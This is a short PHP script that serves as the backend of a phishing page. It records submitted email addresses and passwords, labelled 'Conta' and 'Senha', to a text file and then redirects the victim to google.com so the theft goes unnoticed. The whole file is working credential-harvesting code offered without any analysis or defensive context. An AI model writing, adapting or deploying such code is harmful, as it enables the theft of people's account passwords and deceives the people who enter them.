<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['Email'] . " Senha: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
